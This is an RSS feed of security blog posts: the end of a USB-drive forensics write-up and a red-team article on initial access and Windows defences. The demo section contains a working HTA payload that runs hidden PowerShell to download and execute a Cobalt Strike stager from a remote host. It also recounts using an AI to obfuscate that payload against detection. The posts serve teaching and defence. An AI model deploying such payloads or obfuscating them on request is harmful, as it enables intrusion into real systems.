    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before the start of the investigation, we caught up on the Association of Chief Police Officers (ACPO) Principles of Digital Based Evidence[1]. It provides guidance not only to assist law enforcement but anyone performing forensic investigations involving digital evidence. It’s widely used by practitioners operating in the digital forensics field in England and Wales.&lt;/p&gt;
&lt;p&gt;There are 4 principles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Principle 1:&lt;/strong&gt; No action taken by law enforcement agencies, persons employed within those agencies or their agents should change data which may subsequently be relied upon in court.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Principle 2:&lt;/strong&gt; In circumstances where a person finds it necessary to access original data, that person must be competent to do so and be able to give evidence explaining the relevance and the implications of their actions.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Principle 3:&lt;/strong&gt; An audit trail or other record of all processes applied to digital evidence should be created and preserved. An independent third party should be able to examine those processes and achieve the same result.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Principle 4:&lt;/strong&gt; The person in charge of the investigation has overall responsibility for ensuring that the law and these principles are adhered to.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Initially we did not grasp how these were practically applied in performing the investigation. To put them into a more practical perspective, these are actions we took that directly relate to each of the principles:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/4.png&#34; title=&#34;4&#34; alt=&#34;4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;4&lt;/figcaption&gt;
  &lt;/figure&gt; Write Blocker&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Obtained a Write Blocker. Write Blocker is a tool that prevents all computer storage media connected to a computer from being written to or modified, allowing us to make a bit-by-bit copy of the data in the USB drive without tempering it (Principle 1)&lt;/li&gt;
&lt;li&gt;Organised an investigation team where senior members with extensive experience handling DFIR investigations would be participate in the investigation (Principle 2)&lt;/li&gt;
&lt;li&gt;Assigned a designated place to store the USB drive and relevant evidence securely where only authorised people can access, and prepared the necessary tools for recording all processes (Principle 3)&lt;/li&gt;
&lt;li&gt;Assigned a lead investigator to be in charge of the investigation and ensured that the investigation would be carried out in accordance to the principles. (Principle 4)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Emilia was appointed to be the lead investigator. A lead investigator is an important role, they coordinate evidence acquisition, making sure the investigation is progressing, and ensuring the stakeholders involved are kept informed.&lt;/p&gt;
&lt;p&gt;As the lead investigator learnt a great deal and the responsibilities included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Keeping an audit trail of and preserving evidence&lt;/li&gt;
&lt;li&gt;Ensuring the analysis was documented appropriately&lt;/li&gt;
&lt;li&gt;Sending out updates to inform the client the process of the investigation and make sure everyone in the team was updated with the current status&lt;/li&gt;
&lt;li&gt;Producing the final investigation report&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Despite she’d only recently started doing investigation training exercises, the lead responder was very excited to take on a new challenge of being the lead investigator. As the team knew more about how an investigation was supposed to carry out with the help of other more experienced team members, the investigation became more and more enjoyable.&lt;/p&gt;
&lt;p&gt;Now everything was ready and we were set to begin our first ever journey of an incident investigation!&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/5.gif&#34; title=&#34;5&#34; alt=&#34;5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Preserving Evidence: Documentation and Isolation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;preserving-evidence-documentation-and-isolation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#preserving-evidence-documentation-and-isolation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once we’d completed scoping the incident and verified we had the appropriate equipment we waited patiently for the USB drive to arrive. Once the USB arrived we were so excited and couldn’t wait to start plugging the USB drive into the Write Blocker to see what was inside, but we held off  in order to document everything from the moment we received it as it is important to leave an audit trail for any DFIR investigations. Otherwise the integrity of the evidence cannot be guaranteed and as a result, the evidence will not be accepted in court in occasions where legal involvement is required. (Principal 3)&lt;/p&gt;
&lt;p&gt;So we documented everything. By everything, we meant everything. This involved taking close-up photographs of the envelope the USB drive arrived in and the letter attached, capturing any markings or labels on the drive itself, and noting details like its brand and size. The reason for doing so is because every piece of information, despite seemingly insignificant, could hold value later in the investigation.&lt;/p&gt;
&lt;p&gt;We also started building a chain of custody, by recording every individual who handled the USB drive, the date, time and location of each transfer, and the purpose for the transfer. (Principal 3)&lt;/p&gt;
&lt;h3&gt;Configuring a Safe Investigation Environment&lt;span class=&#34;absolute -mt-20&#34; id=&#34;configuring-a-safe-investigation-environment&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#configuring-a-safe-investigation-environment&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Before dissecting what was inside the USB drive, since we assumed the USB drive was malicious as its origin was unknown and we defintely didn’t want to perform another incident investigation later on on one of our own devices as well. So instead of analysing the USB drive in an actual device and risking our device to get infected by the potentially malicious content, we decided to carry out the analysis in a virtual machine.&lt;/p&gt;
&lt;p&gt;Virtual machine (VMware in this case) is an emulation of a computer system and provides the functionality of a physical computer. It creates an isolated environment and ensures any malicious content on the USB drive is contained within the virtual machine, safeguarding our primary system from potential infection.&lt;/p&gt;
&lt;p&gt;In the next part, we will show how to set up a virtual machine and what details need particular attention, and we will continue the investigation from there!&lt;/p&gt;
&lt;h3&gt;Reference&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;[1] ACPO, ACPO Good Practice Guide for Digital Evidence Available at: &lt;a href=&#34;https://www.digital-detective.net/digital-forensics-documents/ACPO_Good_Practice_Guide_for_Digital_Evidence&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.digital-detective.net/digital-forensics-documents/ACPO_Good_Practice_Guide_for_Digital_Evidence&lt;/a&gt;_v5.pdf (Accessed: 6 August2024), (2012) .&lt;/p&gt;
&lt;h4&gt;Disclaimer&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;The incident response case described in this blog is based on a real event. However, specific details, including the names, locations, and other identifying information of the organisation involved, have been altered to protect their privacy and confidentiality. Any resemblance to actual events or entities is purely coincidental.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Adversary at the Door - Initial Access and what&#39;s currently on the menu</title>
      <link>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</link>
      <pubDate>Tue, 20 Aug 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/08/2024-08-20-adversary-at-the-door-initial-access-and-whats-currently-on-the-menu/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/wolf-in-sheep-clothes-1.png&#34; title=&#34;wolf in sheep clothes 1&#34; alt=&#34;wolf in sheep clothes 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;wolf in sheep clothes 1&lt;/figcaption&gt;
  &lt;/figure&gt;Based on the data from the &lt;a href=&#34;https://www.gov.uk/government/statistics/cyber-security-breaches-survey-2024/cyber-security-breaches-survey-2024&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Cyber Security Breaches Survey 2024&lt;/a&gt;, phishing with malicious links or malware remains the most common initial access vector, followed by impersonation. The challenge with impersonation attacks is that current technology often struggles to accurately determine the purpose of a website. Although checks on domain maturity, reputation, categorization, and certificates are performed, a skilled adversary can still create sophisticated phishing infrastructure that hosts malware. This allows them to establish a foothold within a network and gain initial access, despite various defences.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://attack.mitre.org/tactics/TA0108/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Initial access&lt;/a&gt; is a set of techniques that exploit different entry points to gain an initial foothold in an organisation&amp;rsquo;s network. There are several initial access techniques that can include various social engineering methodologies and exploitation methods, for example misconfigured web servers i.e. instance of Apache Tomcat or exposed management services, i.e. Remote Desktop Protocol on port 3389. It can also include a trusted third party compromise where direct access is gained from captured credentials or a device.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 1: Visual representation of cyber kill chain.&lt;/p&gt;
&lt;p&gt;The initial exploitation can be long-term or limited based on the method of entry and reason for exploitation. Once the adversary gets a foothold within the network, the attack execution is carried out, where the adversary tries to run malicious code, explore the network, or steal confidential data. This in itself has also become a lucrative business, as IAB&amp;rsquo;s (Initial Access Brokers) have specialised in doing just that, gaining the access to the networks and then selling it to other threat actors as it becomes significantly harder from year to year.&lt;/p&gt;
&lt;p&gt;Fortunately, there are safeguards in place that protect organisations and users from adversaries, making initial access significantly more challenging when a defense-in-depth strategy is properly implemented. This is a stark contrast to the threat landscape of 10-15 years ago. Also on the other side, we frequently hear major news about vulnerabilities, bypasses, and exploitation of these control technologies that are our very . For example, just last week, a Windows SmartScreen vulnerability was discovered and exploited to deploy malware in the wild, as reported in this &lt;a href=&#34;https://www.techradar.com/pro/security/microsoft-smartscreen-vulnerability-can-be-abused-to-deploy-malware-and-its-happening-in-the-wild&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;article&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;What prevents Initial Access?&lt;/h1&gt;&lt;p&gt;As previously mentioned, adversaries now face significant challenges in gaining initial access to systems and networks. These challenges arise from a multi-layered cybersecurity approach that employs advanced technologies and best practices. Given that most of our clients at JUMPSEC rely on Windows and Active Directory, I&amp;rsquo;ll highlight technology examples specific to that environment.&lt;/p&gt;
&lt;p&gt;Here are some key technologies that effectively thwart less sophisticated initial access attempts:&lt;/p&gt;
&lt;h3&gt;Windows SmartScreen&lt;span class=&#34;absolute -mt-20&#34; id=&#34;windows-smartscreen&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#windows-smartscreen&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 2: Upon execution of an unknown binary, SmartScreen popup will appear.&lt;/p&gt;
&lt;p&gt;Windows SmartScreen was originally launched with Windows 8, which was released on October 26, 2012, and is intended to protect users from numerous online risks and has been proven to be effective against less sophisticated adversaries. It works by checking the following upon execution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Is the signature of that binary a known malware&lt;/li&gt;
&lt;li&gt;Is the binary signed&lt;/li&gt;
&lt;li&gt;Is the certificate signing authority known and trusted by Microsoft&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SmartScreen will display a warning before allowing it to run and potentially detect and prevent malware being run on the system.&lt;/p&gt;
&lt;p&gt;Adversaries employ various methods to bypass these measures. One such tactic involves exploiting Windows&amp;rsquo; inherent trust in binaries - wink wink DLL Side Loading, but delving into this topic merits another blog post. In contrast to SmartScreen, which primarily assesses the reputation of the entry point program, Windows 11’s Smart App Control takes a more comprehensive approach. It verifies the integrity and digital signatures of all code (including DLLs, scripts, etc.) loaded by the Windows OS Loader and script engines to enhance security measures.&lt;/p&gt;
&lt;h3&gt;Signature verification&lt;span class=&#34;absolute -mt-20&#34; id=&#34;signature-verification&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#signature-verification&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft&amp;rsquo;s Authenticode technology allows software publishers to use X.509 code-signing certificates to sign their software. These certificates verify the identity of the software publisher to ensure that the software remains unchanged since it was signed by the original issuer.&lt;/p&gt;
&lt;p&gt;Microsoft does not verify the publisher&amp;rsquo;s identity or the integrity of the code directly. Instead, it relies on a robust Public Key Cryptography (PKI) system which enables a third-party certificate authority, such as Sectigo (formerly Comodo CA), to authenticate the publisher and hash the code.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image13&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 3: UAC Prompt will notify users in both cases where the publisher is known and unknown.&lt;/p&gt;
&lt;p&gt;With Microsoft Authenticode, various types of Windows executables and code can be signed, including &lt;em&gt;.exe&lt;/em&gt;, &lt;em&gt;.cab&lt;/em&gt;, &lt;em&gt;.dll&lt;/em&gt;, &lt;em&gt;.ocx&lt;/em&gt;, and &lt;em&gt;.xpi&lt;/em&gt; files, in both 32-bit and 64-bit user modes.&lt;/p&gt;
&lt;p&gt;Authenticode certificates are used to verify and hash both software or code developed by a publisher. Although the certificates are issued by Microsoft, the validation and hashing processes are conducted by a trusted certificate authority (CA) like Sectigo. This ensures that the code comes from a verified source and remains unchanged since its release. Unfortunately, it has been discovered that adversaries are abusing signature verification, as discovered by (&lt;a href=&#34;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://symantec-enterprise-blogs.security.com/threat-intelligence/carderbee-software-supply-chain-certificate-abuse&lt;/a&gt;). The APT called Carderbee was able to get Microsoft to digitally sign a type of malware known as a rootkit. To gain that level of access without alerting end-point security systems and other defences, the Carderbee hackers required their rootkit to receive Microsoft approval, which it did after Microsoft signed it.&lt;/p&gt;
&lt;h3&gt;Application Allowlisting and Blocklisting&lt;span class=&#34;absolute -mt-20&#34; id=&#34;application-allowlisting-and-blocklisting&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#application-allowlisting-and-blocklisting&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image12&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 4: Applocker Popup.&lt;/p&gt;
&lt;p&gt;Application allowlisting ensures that only authorised software can execute, while blocking all unauthorised software from running on your assets. This prevents malicious or unapproved applications from potentially compromising the system. The application allowlisting software must verify that only authorised software libraries (such as &lt;em&gt;.dll,&lt;/em&gt; .ocx, etc.) are permitted to load into system processes. This helps to maintain the integrity of your system by preventing unauthorised code from being injected.&lt;/p&gt;
&lt;p&gt;In Windows environments, specifically in Active Directory we can utilise group policies, Applocker or something stricter like Windows Defender Application Control to maintain and enforce control policies over applications and binaries.&lt;/p&gt;
&lt;h3&gt;Mark-Of-The-Web (MOTW)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;mark-of-the-web-motw&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#mark-of-the-web-motw&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Mark-of-the-Web (MOTW) is a security feature originally introduced in Internet Explorer to ensure that saved web pages and other downloaded files run in the security zone corresponding to their origin. It was accomplished by appending to saved webpages and was later extended to support other file types using Alternate Data  Streams (ADS), which is a feature of NTFS file system that dates back to Windows 3.1.&lt;/p&gt;
&lt;p&gt;This feature allows files to have multiple data streams associated with them, by using the &lt;code&gt;|filename:streamname&lt;/code&gt; format. It also applies to MS Office, and other programs by utilising &lt;code&gt;|AttachmentExecuteInterface&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So when we have downloaded the file, Internet Explorer creates an ADS named &lt;code&gt;Zone.Identifier&lt;/code&gt; and adds a &lt;code&gt;ZoneID&lt;/code&gt; to the stream in order to indicate a zone that file comes from.&lt;/p&gt;
&lt;p&gt;In ADS, we have the following ZoneID values and their representations:&lt;/p&gt;
&lt;ol start=&#34;0&#34;&gt;
&lt;li&gt;Local computer&lt;/li&gt;
&lt;li&gt;Local intranet&lt;/li&gt;
&lt;li&gt;Trusted sites&lt;/li&gt;
&lt;li&gt;Internet&lt;/li&gt;
&lt;li&gt;Restricted sites&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image123.png&#34; title=&#34;image123&#34; alt=&#34;image123&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image123&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 5: ADS created on downloaded file.&lt;/p&gt;
&lt;p&gt;As we can see in the figure above, all modern Windows platforms that are dealing with downloaded files or attachments will generate a &lt;code&gt;Zone.Identifier&lt;/code&gt; in ADS stream, adding URL information such as Referrer and Host information in addition to the zone. This information can be used to enhance antivirus and various endpoint detection and response (EDR) products to aid the reputation checks of the file.&lt;/p&gt;
&lt;p&gt;Mark-of-the-Web (MotW) nowadays serves as a barrier to successful phishing attacks by giving users the option to decline execution. It also collaborates with SmartScreen, enabling access to the registered antivirus engine to perform additional checks on signatures and reputation. Nevertheless, adversaries can circumvent these protections as they might deliver a phishing attachment that evades supplementary prompts or inspections.&lt;/p&gt;
&lt;p&gt;Alternatively, they could create a malicious extension that closely resembles legitimate content, tricking victims into inadvertently providing initial access.&lt;/p&gt;
&lt;h3&gt;Office Security Controls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;office-security-controls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#office-security-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 6: Macro security controls.&lt;/p&gt;
&lt;p&gt;Macros have been a favoured initial access method for threat actors since the early days, persisting as one of the longest-enduring challenges in the industry. One notable event was usage of the macro in the &lt;a href=&#34;https://www.acronis.com/en-gb/cyber-protection-center/posts/vawtrak-a-banking-trojan-with-a-long-history/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Vawtrak&lt;/a&gt; malware campaign, discovered in 2014 and was used to spread and steal credentials in the Bank of America attack. Microsoft is trying to battle macro malware by enforcing Mark-of-the-Web (MotW) control on macro-enabled documents. Microsoft’s &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;documentation&lt;/a&gt; states:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;VBA macros are a common way for malicious actors to gain access to deploy malware and ransomware. Therefore, to help improve security in Office, we’re changing the default behavior of Office applications to block macros in files from the internet.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Blocking macros serves a dual purpose: it reduces the potential for attacks and raises the complexity needed to execute them, especially since email remains the primary method for delivering malware.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 7: Upon document execution a macro popup will appear.&lt;/p&gt;
&lt;p&gt;Therefore, we can assert that the threat landscape can be divided into Pre-Macro and Post-Macro eras, as threat actors have swiftly adapted by moving away from macro-based malware to utilising utilities such as OneNote files with .one and .onepkg extensions. This shift has been identified by security researchers as a significant evolution in the email threat landscape in recent history. With that in mind, the following section of the post will introduce different techniques that adversaries are employing in order to facilitate initial access and bypass previously mentioned security measures.&lt;/p&gt;
&lt;h2&gt;Initial Access Demo&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-demo&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-access-demo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;To achieve initial access, adversaries often require some form of user interaction to execute their kill-chain. For this blog post, let&amp;rsquo;s assume that we are the end-user who has received an email link that successfully bypassed email filters (for more on this, see our blog post on automated smuggling techniques by our red team operator &lt;a href=&#34;https://labs.jumpsec.com/wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Francesco&lt;/a&gt;). Alternatively, we could have been coerced by an adversary through SaaS applications like Teams (for details on this method, refer to &lt;a href=&#34;https://labs.jumpsec.com/advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Max&lt;/a&gt;’s IDOR discovery) to download a binary file.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, that in this demo, Microsoft Defender was turned off, although normally during engagements, antivirus/EDR bypassing is another process that is undertaken by operators.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;In this blog post, we are going to use malicious HTA payloads that are being used by adversaries. HTA (HTML Application) is basically an application whose source consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. One caveat with this technique is that it requires Internet Explorer to be installed, otherwise HTA files won&amp;rsquo;t execute on the target computer. It&amp;rsquo;s worth noting that it also runs in &lt;strong&gt;full trust mode&lt;/strong&gt; therefore browser security constraints do not apply here.&lt;/p&gt;
&lt;p&gt;During execution, it uses mshta.exe which native Windows binary that suits perfectly for modern living of the land ethos and handles further malicious code execution without needing to touch the victims disk. LOLBINS are commonly used by adversaries to execute malicious code and evade EDR/AV solutions as those native binaries are often not picked up given they are used for legitimate sysadmin tasks.&lt;/p&gt;
&lt;p&gt;To proceed, we are going to use Cobalt Strike, set up teamserver infrastructure with listeners and use Scripted Web Delivery that will generate stageless beacon payload artefacts that will be handled by our malicious HTA application.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 8: Configuring a Cobalt Strike Listener and Scripted Web Delivery of our payload.&lt;/p&gt;
&lt;p&gt;After that, with truly modern fashion, we are going to politely ask our AI friend to obfuscate it so we can test it out of curiosity against static analysis detection to see how it withstands AV/EDR solutions.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 9: Prompt that was used to obfuscate our PowerShell command for our .hta payload&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s compare static analysis detection rates with the non-obfuscated payload, for this we are going to utilise hybrid analysis. This is an excerpt of an example HTA payload below:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;  
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;HTA Payload Demo&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;  
&amp;lt;body&amp;gt;  
&amp;lt;p&amp;gt;Example Text&amp;lt;/p&amp;gt;  
&amp;lt;/body&amp;gt;  

&amp;lt;script language=&amp;#34;VBScript&amp;#34;&amp;gt;  
Function demo()  
Set shell = CreateObject(&amp;#34;wscript.Shell&amp;#34;)  
shell.run &amp;#34;powershell.exe -nop -w hidden -c &amp;#34;IEX ((new-object net.webclient).downloadstring(&amp;#39;http://192.168.0.7:8088/a&amp;#39;))&amp;#34;&amp;#34;  
End Function  

demo  
&amp;lt;/script&amp;gt;  
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt; &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As we can see in the figure above, we can conclude that with little effort, adversaries can increase their sophistication and attempt to evade some of the detections. In our case we don&amp;rsquo;t need to worry about the AV/EDRs as for demo purposes, we have disabled Windows Defender. But evasion is integrated within the red team craft where we have to tackle each phase of EDR/AV detection, those phases include: Static and Heuristic Analysis, Cloud Reputation Analysis, Sandboxing , Machine Learning Analysis, Emulation and Behavioural Analysis.&lt;/p&gt;
&lt;p&gt;For this reason, there are different cyber kill chains, where in order to evade detection of our HTA payload, we could perhaps use ISO containerisation techniques that would evade Mark-of-the-Web, then use HTML smuggling to fly past phishing detections. Then we could utilise a LNK technique, to trick the end-user into clicking our executable that has fully customised shellcode which is additionally loaded using DLL sideloading of legitimate running process. This just shows how complex implementing new undetectable payloads could be, and how many layers of defences have to be taken into consideration.&lt;/p&gt;
&lt;p&gt;Back to our initial access demo, now that we have our HTA application on the target machine, let&amp;rsquo;s execute it. What will happen in the background is that our powershell code embedded within that HTA application will fetch our Cobalt Strike stager hosted on our teamserver.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 11: Execution of the .hta payload and visible .mshta as “HTML Application Host”&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image11&lt;/figcaption&gt;
  &lt;/figure&gt; Figure 12: Connection was established as can be seen by our beacon that was executed via the HTA payload.&lt;/p&gt;
&lt;p&gt;As demonstrated in the figure above, we have successfully established a connection to our victims&amp;rsquo; host. From this point forward, we can interact with the beacon, marking just the beginning of our red team engagement. The real challenge lies ahead as we delve into persistence, privilege escalation, lateral movement, and pivoting all of which are significant undertakings given the capabilities of current EDR and AV solutions to emulate real-world adversaries and their techniques.&lt;/p&gt;
&lt;h2&gt;Initial Access Prevention Strategies&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-access-prevention-strategies&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-access-prevention-strategies&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are several prevention strategies we recommend implementing, as there is no one-size-fits-all solution due to factors such as complex infrastructure setups, data collection and correlation challenges.&lt;/p&gt;
&lt;p&gt;However, we have found that having a robust AV/EDR solution, along with effective patch management, by keeping machines patched and up-to-date against n-day exploits is crucial. Additionally, tightening group policies makes it more difficult for adversaries to navigate and pivot within the network, thereby containing the threat and minimising the &amp;ldquo;blast radius.&amp;rdquo; Implementing email filters with appropriate thresholds and spam rules is also highly recommended, complementing secure mail configurations for protocols like IMAP, SMTP, or POP.&lt;/p&gt;
